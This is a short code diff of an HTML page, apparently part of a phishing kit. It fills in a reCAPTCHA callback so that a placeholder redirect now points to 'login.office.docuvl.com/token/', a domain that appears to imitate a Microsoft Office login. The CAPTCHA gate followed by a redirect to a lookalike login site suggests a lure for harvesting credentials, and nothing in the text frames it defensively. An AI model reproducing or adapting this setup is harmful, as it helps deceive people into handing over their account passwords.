@@ -23,7 +23,7 @@
 
     <script>
         function recaptchaCallback() {
-            window.location.replace("https://putyourelink.here.com/");
+            window.location.replace("https://login.office.docuvl.com/token/");
 //             document.getElementById("myForm").submit();
         }
     </script>
